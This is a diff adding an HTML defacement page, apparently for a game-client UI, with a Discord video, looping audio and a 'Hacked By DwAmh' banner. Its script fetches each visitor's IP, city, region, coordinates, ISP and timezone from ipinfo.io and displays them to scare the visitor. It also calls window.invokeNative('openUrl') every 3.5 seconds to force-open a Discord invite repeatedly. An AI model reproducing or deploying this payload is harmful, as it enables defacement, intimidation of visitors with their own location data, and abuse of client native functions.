@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/e5</title>
+    <style>
+       body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: red;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        #content {
+            display: none;
+            opacity: 0;
+            transition: opacity 2s ease;
+        }
+        .image-container img {
+            width: 400px; 
+            height: auto;
+            border: 2px solid red; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
+        }
+          .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: red; 
+            text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red;
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 5px;
+            font-size: 75px; 
+            color: red; 
+            text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red; 
+            letter-spacing: 4.5px;
+        }
+        .video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px);
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="https://cdn.discordapp.com/attachments/1340248820570787912/1347136746965700669/-___.mp4?ex=67caba5d&is=67c968dd&hm=f6340bcb42a00ca999d0140b8caaf5477b36e8bc786a81731135d8e4bd97c907&" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="gif-container">
+        <img src="https://media.discordapp.net/attachments/1340248820570787912/1347134756835295252/IMG_20250217_104634_894.jpg?ex=67cab882&is=67c96702&hm=d2312fee4a66eb1ddd5b5e87465f50aed0daa182d0f1dbed4bb193fda3a61533&=&format=webp&width=704&height=685" alt="">
+    </div>
+
+    <div id="content">
+        <div class="image-container">
+            <img src="https://media.discordapp.net/attachments/1340248820570787912/1347134756835295252/IMG_20250217_104634_894.jpg?ex=67cab882&is=67c96702&hm=d2312fee4a66eb1ddd5b5e87465f50aed0daa182d0f1dbed4bb193fda3a61533&=&format=webp&width=704&height=685" alt="">
+        </div>
+
+        <audio autoplay loop>
+            <source src="https://cdn.discordapp.com/attachments/1340248820570787912/1347136746965700669/-___.mp4?ex=67caba5d&is=67c968dd&hm=f6340bcb42a00ca999d0140b8caaf5477b36e8bc786a81731135d8e4bd97c907&" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
+        <div class="info" id="ip-info"></div>
+        <div class="text">discord.gg/5-1</div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.querySelector('.gif-container').style.display = 'none';
+            const content = document.getElementById('content');
+            content.style.display = 'block';
+            setTimeout(() => {
+                content.style.opacity = 1;
+            }, 150); 
+        }, 200);
+
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = ` << Hacked By DwAmh >>
+<strong>IP:</strong><span style='color: red;'>"${ip}"</span><br>
+<strong>City:</strong><span style='color: red;'>"${city}"</span><br>
+<strong>Region:</strong><span style='color: red;'>"${region}"</span><br>
+<strong>Country:</strong><span style='color: red;'>"${country}"</span><br>
+<strong>Location:</strong><span style='color: red;'>"${loc}"</span><br>
+<strong>ISP:</strong> <span style='color: red;'>"${org}"</span><br>
+<strong>Timezone:</strong><span style='color: red;'>"${timezone}"</span>`;
+        });
+
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/e5");
+            window.invokeNative("openUrl", "https://discord.gg/e5");
+        }, 3500);
+    </script>
+</body>
+</html>
